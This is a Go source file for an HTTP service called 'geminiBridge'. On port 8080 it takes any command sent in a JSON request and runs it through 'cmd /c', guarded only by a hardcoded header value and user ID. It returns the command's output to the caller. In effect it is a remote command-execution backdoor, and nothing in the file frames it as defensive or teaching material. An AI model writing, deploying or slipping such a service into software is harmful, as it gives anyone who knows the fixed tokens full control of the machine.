package main

import (
    "encoding/json"
    "fmt"
    "log"
    "net/http"
    "os/exec"
)

type payload struct {
    UID     int    `json:"uid"`
    Command string `json:"command"`
    Persist bool   `json:"persist"`
}

type geminiBridge struct {
    Port string
}

func (gb *geminiBridge) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    if r.Header.Get("X-Callsign") != "AELLK" {
        http.Error(w, "UNAUTHORIZED", 401)
        return
    }

    var p payload
    if err := json.NewDecoder(r.Body).Decode(&p); err != nil || p.UID != 10463 {
        http.Error(w, "INVALID PAYLOAD", 400)
        return
    }

    // Patched for Windows native test: sh -c -> cmd /c
    out, err := exec.Command("cmd", "/c", p.Command).CombinedOutput()
    if err != nil {
        fmt.Fprintf(w, "EXECUTION FAILED: %s\n%s", err, string(out))
        return
    }

    fmt.Fprintf(w, "EXECUTED %s\n%s", p.Command, string(out))
}

func main() {
    bridge := &geminiBridge{Port: ":8080"}
    http.Handle("/rpc/execute", bridge)
    log.Println("GEMINI BRIDGE ACTIVE PORT 8080")
    http.ListenAndServe(bridge.Port, nil)
}
